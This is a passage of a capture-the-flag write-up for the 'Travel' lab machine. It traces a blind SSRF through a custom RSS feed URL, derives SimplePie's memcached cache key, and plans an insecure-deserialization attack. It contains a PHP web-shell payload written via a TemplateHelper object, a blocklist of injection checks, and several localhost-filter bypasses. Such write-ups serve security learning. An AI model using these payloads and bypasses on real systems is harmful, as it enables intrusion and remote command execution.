<span class="keyword">or</span> strpos(<span class="variable">$tmpUrl</span>, <span class="string">&quot;-F&quot;</span>) !== <span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;&lt;h2&gt;Hacking attempt prevented (Command Injection). Event has been logged.&lt;/h2&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$tmp</span> = parse_url(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line">        <span class="comment">// preventing all localhost access</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$tmp</span> == <span class="string">&quot;localhost&quot;</span> <span class="keyword">or</span> <span class="variable">$tmp</span> == <span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$url</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">url_get_contents</span> (<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$url</span> = safe(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$url</span> = escapeshellarg(<span class="variable">$url</span>);</span><br><span class="line">        <span class="variable">$pl</span> = <span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>;</span><br><span class="line">        <span class="variable">$output</span> = shell_exec(<span class="variable">$pl</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TemplateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="keyword">string</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init(<span class="keyword">$this</span>-&gt;file, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="keyword">string</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        file_put_contents(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/logs/&#x27;</span>.<span class="keyword">$this</span>-&gt;file, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The file is mainly used to retrieve remote RSS file using <code>curl</code>. In addition there is a few “security” check to make sure the parsing of custom RSS url doesn’t get abused. </p>
<p>Well now that’s a lot of informations. Let’s put everything together to see if we can progress.</p>
<h3 id="Blind-SSRF-With-Custom-RSS-Feed"><a href="#Blind-SSRF-With-Custom-RSS-Feed" class="headerlink" title="Blind SSRF With Custom RSS Feed"></a>Blind SSRF With Custom RSS Feed</h3><p>First thing I wanted to try was to check this <code>custom_feed_url</code> function.</p>
<p>Let’s create a valid RSS file and host it on our machine using Python server:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rss</span> <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">channel</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>RSS Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">description</span>&gt;</span>This is an example of an RSS feed<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://www.example.com/main.html<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">lastBuildDate</span>&gt;</span>Mon, 06 Sep 2010 00:01:00 +0000 <span class="tag">&lt;/<span class="name">lastBuildDate</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Sun, 06 Sep 2009 16:20:00 +0000<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">ttl</span>&gt;</span>1800<span class="tag">&lt;/<span class="name">ttl</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">item</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Example entry<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>Here is some text containing an interesting description.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span>&gt;</span>http://www.example.com/blog/post/1<span class="tag">&lt;/<span class="name">link</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">pubDate</span>&gt;</span>Sun, 06 Sep 2009 16:20:00 +0000<span class="tag">&lt;/<span class="name">pubDate</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">channel</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rss</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure>

<p>Now navigating to <code>http://blog.travel.htb/awesome-rss/?custom_feed_url=http://10.10.14.18:8000/sample.xml</code> indeed display our custom RSS feed:</p>
<img width="1030" alt="travel custom rss" src="https://user-images.githubusercontent.com/9076747/83437662-69510100-a440-11ea-98a4-3d8ac8af6d79.png">

<p>And we can see a new request have been made to our web server from the box:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.10.10.189 - - [5/May/2020 19:44:38] <span class="string">&quot;GET /sample.xml HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>That’s good, we got Blind SSRF (Server Side Request Forgery)!</p>
<p>But what now? With Blind SSRF only we can’t do much yet. Since we can’t even read local files using <code>file://</code>…</p>
<p>Let’s continue to review what we found so far to see if it can be linked with that SSRF.</p>
<h3 id="Debug-php"><a href="#Debug-php" class="headerlink" title="Debug.php"></a>Debug.php</h3><p>I then got curious about `debug.php file. Maybe it can leak juicy informations ?</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.17.6</span><br><span class="line">Content-Length: 132</span><br><span class="line">X-Powered-By: PHP/7.3.16</span><br><span class="line"></span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br></pre></td></tr></table></figure>

<p>Well that’s not very helpful. Yet while looking around and testing various things I got the <code>debug</code> to throw some informations. Indeed just after calling a <code>custom_feed_url</code> with the debug parameter we get the following:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;http://blog.travel.htb/awesome-rss/?debug&amp;custom_feed_url=http://10.10.14.18:8000/sample.xml&quot;</span> -s &gt; /dev/null</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ curl http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.17.6</span><br><span class="line">Content-Length: 198</span><br><span class="line">X-Powered-By: PHP/7.3.16</span><br><span class="line"></span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">| xct_a0e937ab19(...) | a:4:&#123;s:5:<span class="string">&quot;child&quot;</span>;a:1:&#123;s:0:<span class="string">&quot;&quot;</span>;a:1:&#123;(...) |</span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br></pre></td></tr></table></figure>

<p>Both output are truncated, yet we notice the <code>xct_</code> prefix here, if you remember we saw it being used by <code>SimplePie</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$simplepie</span>-&gt;set_cache_location(<span class="string">&#x27;memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>SimplePie documentation explains:</p>
<blockquote>
<p> To use Memcache for SimplePie’s cache, simply set your cache location with a memcache.</p>
<p>For example, <code>memcache://localhost:11211/?timeout=3600&amp;prefix=sp_</code> will connect to memcache on localhost on port 11211. All tables will be prefixed with sp_ and data will expire after 3600 seconds.</p>
<p><a target="_blank" rel="noopener" href="https://simplepie.org/api/class-SimplePie_Cache_Memcache.html">https://simplepie.org/api/class-SimplePie_Cache_Memcache.html</a></p>
</blockquote>
<p>Reading through SimplePie <code>memcache.php</code> <a target="_blank" rel="noopener" href="https://simplepie.org/api/source-class-SimplePie_Cache_Memcache.html#102">source code</a> we understand the given prefix is used to generated the <code>memcached</code> entry key:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;name = <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;extras&#x27;</span>][<span class="string">&#x27;prefix&#x27;</span>] . md5(<span class="string">&quot;<span class="subst">$name</span>:<span class="subst">$type</span>&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>In addition, still reading through the source code of SimplePie we see that it’s serialize data and save it in the <code>memcached</code> entry. Once loading RSS from cache it will unserialize the stored data:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Save data to the cache</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> array|SimplePie $data Data to store in the cache. If passed a SimplePie object, only cache the $data property</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool Successfulness</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span> <span class="keyword">instanceof</span> SimplePie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$data</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span></span><br><span class="line">        -&gt;cache</span><br><span class="line">        -&gt;set(<span class="keyword">$this</span>-&gt;name, serialize(<span class="variable">$data</span>) , MEMCACHE_COMPRESSED, (<span class="keyword">int</span>)<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;extras&#x27;</span>][<span class="string">&#x27;timeout&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Retrieve the data saved to the cache</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> array Data for SimplePie::$data</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="keyword">$this</span></span><br><span class="line">        -&gt;cache</span><br><span class="line">        -&gt;get(<span class="keyword">$this</span>-&gt;name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span> !== <span class="literal">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> unserialize(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This make perfect sense with the output of <code>debug.php</code> that very probably show the lasted entry added (or loaded) from <code>memcached</code>:</p>
<ul>
<li>Key: <code>xct_a0e937ab19(...)</code></li>
<li>Content: <code>a:4:&#123;s:5:&quot;child&quot;;a:1:&#123;s:0:&quot;&quot;;a:1:&#123;(...)</code></li>
</ul>
<p>And now we can see how we could potentially exploit this flow…</p>
<h3 id="Object-Deserialization-Vulnerability"><a href="#Object-Deserialization-Vulnerability" class="headerlink" title="Object Deserialization Vulnerability"></a>Object Deserialization Vulnerability</h3><p>If you remember, in <code>template.php</code> we have this <code>TemplateHelper</code> Object:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TemplateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="keyword">string</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;init(<span class="keyword">$this</span>-&gt;file, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$file</span>, <span class="keyword">string</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        file_put_contents(<span class="keyword">__DIR__</span>.<span class="string">&#x27;/logs/&#x27;</span>.<span class="keyword">$this</span>-&gt;file, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>If we find a way to create a new instance of <code>TemplateHelper()</code> we could actually exploit the <code>file_put_contents()</code> to write a web-shell to  <code>wp-content/themes/twentytwenty/logs/</code>. Like so:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span>(<span class="string">&quot;TemplateHelper.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;hg8.php&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">&#x27;&lt;?php system($_REQUEST[&quot;cmd&quot;]);&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> TemplateHelper(<span class="variable">$file</span>, <span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>

<p>That’s exactly what we need with the behaviour of <code>SimplePie</code> we found earlier. Let me explain.</p>
<ol>
<li><p><code>SimplePie</code> stores, for each RSS feed, a <code>memcached</code> entry containing serialized PHP. </p>
</li>
<li><p>Upon loading an RSS feed already cached before, <code>SimplePie</code> will take the <code>memcached</code> entry and unserialize the data with:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">load</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> unserialize(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>By storing a malicious serialized <code>TemplateHelper()</code> object (the one shown above) in the right <code>memcached</code> entry, <code>SimplePie</code> will execute it during the unserialize process (as know as <a target="_blank" rel="noopener" href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A8-Insecure_Deserialization">Insecure Deserialization Vulnerability</a>). This will write our web-shell to the server.</p>
</li>
</ol>
<p>Sounds all good. Yet we are missing one point: <em>How to write our malicious <code>memcached</code> entry ?</em></p>
<p>That’s where the SSRF vulnerability we found earlier come to play :) </p>
<h3 id="SimplePie-Memcached-Key"><a href="#SimplePie-Memcached-Key" class="headerlink" title="SimplePie Memcached Key"></a>SimplePie Memcached Key</h3><p>First of all, we need to make sure to write our malicious payload to a <code>memcached</code> entry that <code>SimplePie</code> will deserialize.</p>
<p>By the code we know for sure that the default RSS feed (<code>http://www.travel.htb/newsfeed/customfeed.xml</code>) is stored in <code>memcached</code> and loaded when we open <code>Awesome RSS</code> without extra parameters. </p>
<p>Knowing this the best way to go would be to overwrite <code>customfeed.xml</code> <code>memcached</code> entry with our malicious payload. </p>
<p>The syntax to update a <code>memcached</code> entry is the following:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set key flags exptime bytes [noreply]  </span><br><span class="line">value </span><br></pre></td></tr></table></figure>

<p>But an issue arise. How can we find the <code>memcached</code> key used by <code>SimplePie</code>?</p>
<p>Well we saw earlier from the <a target="_blank" rel="noopener" href="https://simplepie.org/api/source-class-SimplePie_Cache_Memcache.html#102">source code</a> that key is the following format:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5(feed_url + <span class="string">&quot;:spc&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>So for <code>http://www.travel.htb/newsfeed/customfeed.xml</code> it should gives us the following MD5:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">print</span> md5(<span class="string">&quot;http://www.travel.htb/newsfeed/customfeed.xml&quot;</span> . <span class="string">&quot;:spc&quot;</span>);</span><br><span class="line"><span class="number">15</span>f4a13c9f97c9c2cf6791a16d4fa683</span><br></pre></td></tr></table></figure>

<p>Yet that doesn’t match the entry shown by the <code>debug.php</code> page:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl <span class="string">&quot;http://blog.travel.htb/awesome-rss/?debug&quot;</span> -s &gt; /dev/null</span><br><span class="line">[hg8@archbook ~]$ curl http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php </span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">| xct_4e5612ba07(...) | a:4:&#123;s:5:<span class="string">&quot;child&quot;</span>;a:1:&#123;s:0:<span class="string">&quot;&quot;</span>;a:1:&#123;(...) |</span><br><span class="line"> ~~~~~~~~~~~~~~~~~~~~~ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br></pre></td></tr></table></figure>

<p>By digging a bit more in the source code we found that another <code>MD5</code> is being made on top of the previous one. Creating the hash this way: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://simplepie.org/api/source-class-SimplePie.html#1266</span></span><br><span class="line">MD5(MD5(feed_url + <span class="string">&quot;:spc&quot;</span>))</span><br></pre></td></tr></table></figure>

<p>So for <code>http://www.travel.htb/newsfeed/customfeed.xml</code> it should gives us the following MD5 as <code>memcached</code> key:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; <span class="keyword">print</span> md5(md5(<span class="string">&quot;http://www.travel.htb/newsfeed/customfeed.xml&quot;</span>) . <span class="string">&quot;:spc&quot;</span>);</span><br><span class="line"><span class="number">4e5612</span>ba079c530a6b1f148c0b352241</span><br></pre></td></tr></table></figure>

<p>Bingo! That match the partiel key we got from <code>debug.php</code>. We now have the <code>memcached</code> key for the entry we want to overwrite.</p>
<h3 id="Memcached-injection"><a href="#Memcached-injection" class="headerlink" title="Memcached injection"></a>Memcached injection</h3><p>Alright that’s a lot of informations so far but we slowly manage to get all the pieces together right ?</p>
<img width="500" alt="travel" src="https://user-images.githubusercontent.com/9076747/83969018-80bf3c80-a8cd-11ea-8f14-e1ca4cf8ad92.jpg">

<p>We have:</p>
<ul>
<li>Our malicious serialized PHP payload to drop a web-shell.</li>
<li>The <code>memcached</code> entry to inject our payload to.</li>
<li>SSRF</li>
</ul>
<p>It now seems straightforward to use server-side request forgery in order to inject our payload to <code>memcached</code> (running on internal port <code>11211</code>). </p>
<h4 id="Bypassing-SSRF-protection"><a href="#Bypassing-SSRF-protection" class="headerlink" title="Bypassing SSRF protection"></a>Bypassing SSRF protection</h4><blockquote>
<p>But wait… Didn’t we saw SSRF protection in <code>Template.php</code>?</p>
</blockquote>
<p>Let’s take a look at it:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$tmp</span> = parse_url(<span class="variable">$url</span>, PHP_URL_HOST);</span><br><span class="line"><span class="comment">// preventing all localhost access</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$tmp</span> == <span class="string">&quot;localhost&quot;</span> <span class="keyword">or</span> <span class="variable">$tmp</span> == <span class="string">&quot;127.0.0.1&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;h2&gt;Hacking attempt prevented (Internal SSRF). Event has been logged.&lt;/h2&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$url</span>;</span><br></pre></td></tr></table></figure>

<p>Well that’s quite weak protection and there is more than a way to bypass it:</p>
<ol>
<li><p>Since it’s using a weak comparison we could simply use capital “LOCALHOST” or even “localHost”:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(<span class="string">&quot;localhost&quot;</span> == <span class="string">&quot;LOCALHOST&quot;</span>);</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line">php &gt; var_dump(<span class="string">&quot;localhost&quot;</span> == <span class="string">&quot;localhOst&quot;</span>);</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure></li>
<li><p>And then well we have plenty of other ways to call on localhost that is not <code>localhost</code> nor <code>127.0.0.1</code>. Here is a few possible way:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl 127.0.0.1</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 0</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 0.0.0.0</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 127.1</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl  0177.0000.0000.0001</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 0x7F000001</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 2130706433</span><br><span class="line">hello from localhost!</span><br><span class="line">[hg8@archbook ~]$ curl 127.00.00.1</span><br><span class="line">hello from localhost!</span><br></pre></td></tr></table></figure></li>
<li><p>Using a domain name which DNS record pointing to <code>127.0.0.1</code> like <code>http://localtest.me</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://localtest.me/</span><br><span class="line">hello from localhost!</span><br></pre></td></tr></table></figure></li>
</ol>
<p>As you can see it shouldn’t be hard to bypass this SSRF protection. From now on I will use <code>127.1</code>.</p>
